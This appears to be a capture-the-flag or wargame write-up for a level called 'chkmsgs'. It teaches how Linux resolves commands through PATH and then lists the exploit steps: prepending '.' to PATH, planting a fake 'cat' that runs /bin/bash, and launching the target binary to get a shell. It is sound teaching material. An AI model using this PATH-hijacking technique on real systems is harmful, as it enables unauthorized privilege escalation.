## chkmsgs.md

This one is tricky, and requires knowledge about how Linux and similar operating systems handle running binaries. When you run a command like `ls` for example, how does Linux know to run the `ls` executable that you want? Remember, these commands are all programs on the machine stored somewhere, and the operating system has to find them somehow.

**If you were looking for a hint stop reading now**

In the Linux operating system, there are global variables that hold information. These variables are called environment variables, and one in particular holds information about where executables are stored on a system. This variable is called the `PATH`. In your terminal, you can print the `PATH` variable by running `echo $PATH`.

Prepend the path with the current directory  
`export PATH=.:$PATH`  
Create a file named `cat` with the string `/bin/bash` inside  
`echo "/bin/bash" > cat`  
Make the cat file executable  
`chmod u+x cat`  
Exploit  
`./chkmsgs`  
You can fix your PATH variable by restarting your terminal or running `export` and setting `PATH` back to the original string

**Why does this work?**  
Anytime you run a command, the operating system looks at the `PATH` variable and searches every directory listed in it for a program of the same name as the command you typed. Once it finds one that matches, it runs it immediately. In other words, it runs the _first_ one it finds. What you've done is created a different `cat` program, and made sure the OS finds yours first by prepending the current directory to the `PATH` variable.
